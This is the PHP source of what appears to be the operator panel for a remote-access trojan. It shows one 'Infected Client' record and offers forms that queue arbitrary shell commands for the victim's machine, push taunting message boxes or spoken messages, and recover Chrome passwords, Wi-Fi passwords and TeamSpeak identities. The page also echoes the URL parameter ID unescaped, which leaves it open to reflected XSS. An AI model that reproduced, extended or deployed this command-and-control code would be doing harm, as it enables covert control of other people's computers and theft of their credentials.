<!DOCTYPE html>
<?php
session_start();
if (!isset($_SESSION['Connected'])){
	echo '<script>window.location.href = "..?error=3";</script>';
	die();
}
if ($_SESSION['Connected'] != True) {
	echo '<script>window.location.href = "..?error=3";</script>';
	die();
}

function SafeStr($string){
	return strtr( $string, array(  "\n" => "\\n",  "\r" => "\\r",  "\\" => "\\\\" ,  "<" => " ",  ">" => " "  ));
}

?>
<html>
	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="../css/styles.css">
	</head>
	<body>
		<div id="mySidenav" class="sidenav">
			<a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
			
			<a href="">Desinfect Client</a>
			<!--
			<a href="">Clients</a>
			<a href="/">Services</a>
			<a href="">About</a>
			-->
		</div>

		<div id="main">
			<div id='ActionBar'>
				<span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
			<div>
			<div id="main_inside">
				<h2>Infected Client n°<?php echo ($_GET['ID'])?></h2>
				<p>Information About client :</p>
				
					<?php
						if (!isset($_GET['ID'])){
							echo '<script>window.location.href = "..?error=2";</script>';
						}else {
							/*---------------- Connect to DB -----------------*/
							include('../Config.php');
							try
							{
								$bdd = new PDO('mysql:host='.$DB_Cfg_Host.';dbname='.$DB_Cfg_Name.';charset=utf8', $DB_Cfg_Username, $DB_Cfg_Password);
								array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION);
							}
							catch (Exception $e)
							{
								echo '<script>window.location.href = "..?error=2";</script>';
								die('Erreur : ' . $e->getMessage());
							}
							$reponse = $bdd->query('SELECT * FROM clients');

							while ($donnees = $reponse->fetch())
							{
								if ($_GET['ID'] == $donnees['ID'] ){
									echo ('<b>ID :</b> '.$donnees['ID'].'<br>');
									echo ('<b>UUID :</b> '.$donnees['UUID'].'<br>');
									echo ('<b>Name :</b> '.$donnees['Name'].'<br>');
									echo ('<b>Info :</b> '.$donnees['Info'].'<br>');
									echo ('<b>First Time Added :</b> '.$donnees['Time Added'].'<br><br>');
									
									echo ('
									<div id="formContainer">
										<button class="tablink" onclick="openCity(\'div1\', this, \'#f44336\')" id="defaultOpen">CMD</button>
										<button class="tablink" onclick="openCity(\'div2\', this, \'#4caf50\')">Massage Box</button>
										<button class="tablink" onclick="openCity(\'div3\', this, \'#2196f3\')">Recover Informations</button>
										<button class="tablink" onclick="openCity(\'div4\', this, \'#ff5722\')">Other Functions</button>
										
										<div id="div1" class="tabcontent">
										  <form target="_blank" action="../php/AddCMD.php" method="post" enctype="multipart/form-data">
												<label>Command : </label><br><br> <textarea name="MainShit" rows="1" cols="100">ping google.com</textarea><br><br>
												
												<input type="hidden" name="CMDType" value="CMD">
												<input type="hidden" name="ClientID" value="'.$donnees['ID'].'">
												<input type="submit" value="Send" />
											</form>
										</div>

										<div id="div2" class="tabcontent">
											<form target="_blank" action="../php/AddCMD.php" method="post" enctype="multipart/form-data">
												<label>Massage : </label><br> <textarea name="MainShit" rows="5" cols="100">u r fat ! :)</textarea><br>
												<select id="SelectmsgType_id" name="MsgType" onchange="SelectMsgType()">
													<option value="0">Massege Box</option>
													<option value="1">Say it</option>
												</select><br><br>
												
												<div id="voice" style="display:none;">
													<input type="radio" name="MssageIcon" value="0">Male voice<br>
													<input type="radio" name="MssageIcon" value="1">female voice<br><br>
												</div>

												<div id="MsgeBox">
													<input type="radio" name="MssageIcon" value="16">Critical Message<br>
													<input type="radio" name="MssageIcon" value="32">Warning Query<br>
													<input type="radio" name="MssageIcon" value="48">Warning Message<br>
													<input type="radio" name="MssageIcon" value="64">Information<br><br>
												</div>
												
												<input type="hidden" name="CMDType" value="MessageBox">
												<input type="hidden" name="ClientID" value="'.$donnees['ID'].'">
												<input type="submit" value="Send" />
											</form>
										</div>

										<div id="div3" class="tabcontent">
											<form target="_blank" action="../php/AddCMD.php" method="post" enctype="multipart/form-data">
												<input type="radio" name="MainShit" value="0">Chrome Passwords<br>
												<input type="radio" name="MainShit" value="1">Wifi Passwords<br>
												<input type="radio" name="MainShit" value="2">TS3 Identities<br><br>
												
												<input type="hidden" name="CMDType" value="InfoRecover">
												<input type="hidden" name="ClientID" value="'.$donnees['ID'].'">
												<input type="submit" value="Send" />
											</form>
										</div>
										<div id="div4" class="tabcontent">
										  <h3>Zbeub</h3>
										  <p>zbeubzbeub zbeub zbeubzbeub</p>
										</div>
										<br>
									</div>
									');
									echo ('<b>Last Contact :</b> '.$donnees['Last Connection'].'<br><br>');

									$CMD_Dict = get_object_vars(json_decode(str_replace("'","\"",SafeStr($donnees['CMD']))));
									if ($CMD_Dict['Status'] == '0'){
										$Color_Status = '#ffff00';
										$CMD_Status = 'Waiting Execution';
									}else {
										$Color_Status = '#00ff00';
										$CMD_Status = 'Executed';
									}
									echo ('<b>CMD_Command :</b> '.$CMD_Dict['Command'].'<br>');
									echo ('<b>CMD_Status :</b> <label style="color:'.$Color_Status.';">'.$CMD_Status.'</label><br><br>');
									
									$CMDOutput_Dict = get_object_vars(json_decode(str_replace("'","\"",SafeStr($donnees['CMDOutput']))));
									if ($CMDOutput_Dict['Success'] == '0'){
										$Color = '#00ff00';
										$msg = 'Success';
									}else {
										$Color = '#ff0000';
										$msg = 'Error';
									}
									
									echo ('<b>CMDOutput_Success :</b> <label style="color:'.$Color.';">'.$msg.'</label><br>');
									echo ('<b>CMDOutput_CmdOutput :</b> <label style="color:'.$Color.';">'.nl2br ($CMDOutput_Dict['CmdOutput']).'</label><br>');
									
								}else{
									// echo ('ID : '.$_GET['ID'].' Does\'nt exist on DB');
								}
							}
							$reponse->closeCursor(); // Termine le traitement de la requête
						}
					?>
			</div>
		</div>
		<script>
		function openNav() {
			document.getElementById("mySidenav").style.width = "250px";
			document.getElementById("main").style.marginLeft = "250px";
			document.getElementById("ActionBar").style.backgroundColor = "rgba(0,0,0,0.3)";
			document.body.style.backgroundColor = "rgba(0,0,0,0.1)";
		}
		function closeNav() {
			document.getElementById("mySidenav").style.width = "0";
			document.getElementById("main").style.marginLeft= "0";
			document.getElementById("ActionBar").style.backgroundColor = "#14171a";
			document.body.style.backgroundColor = "#979ba1";
		}
		
		function openCity(cityName, elmnt, color) {
			// Hide all elements with class="tabcontent" by default */
			var i, tabcontent, tablinks;
			tabcontent = document.getElementsByClassName("tabcontent");
			for (i = 0; i < tabcontent.length; i++) {
				tabcontent[i].style.display = "none";
			}

			// Remove the background color of all tablinks/buttons
			tablinks = document.getElementsByClassName("tablink");
			for (i = 0; i < tablinks.length; i++) {
				tablinks[i].style.backgroundColor = "";
			}

			// Show the specific tab content
			document.getElementById(cityName).style.display = "block";

			// Add the specific color to the button used to open the tab content
			elmnt.style.backgroundColor = color;
		}

		// Get the element with id="defaultOpen" and click on it
		document.getElementById("defaultOpen").click();
		
		function SelectMsgType() {
			var x = document.getElementById("SelectmsgType_id").value;
			if (x == '0'){
				document.getElementById("MsgeBox").style.display = "block";
				document.getElementById("voice").style.display = "none";
			}else{
				document.getElementById("MsgeBox").style.display = "none";
				document.getElementById("voice").style.display = "block";
			};
			
			
		}
		</script>
	</body>
</html> 
